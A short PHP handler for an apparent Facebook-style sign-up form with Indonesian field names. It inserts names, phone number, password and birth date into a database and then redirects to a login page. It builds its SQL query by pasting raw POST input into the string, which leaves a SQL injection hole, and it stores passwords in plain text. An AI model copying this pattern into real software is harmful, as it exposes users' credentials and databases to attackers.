<?php
include 'koneksi.php';
$nama_depan			= $_POST['nama_depan'];
$nama_belakang 	= $_POST['nama_belakang'];
$no_seluler			= $_POST['no_seluler'];
$sandi					= $_POST['sandi'];
$tanggal				= $_POST['tanggal'];
$bulan					= $_POST['bulan'];
$tahun					= $_POST['tahun'];
$jenis_kelamin	= $_POST['jenis_kelamin'];

$sql = "INSERT INTO daftar_facebook2 (nama_depan,nama_belakang,no_seluler,sandi,tanggal,bulan,tahun,jenis_kelamin) VALUES ('$nama_depan','$nama_belakang','$no_seluler','$sandi','$tanggal','$bulan','$tahun','$jenis_kelamin')";
mysqli_query($connect,$sql);
header('location:kurniloginfacebook1.php');
?>
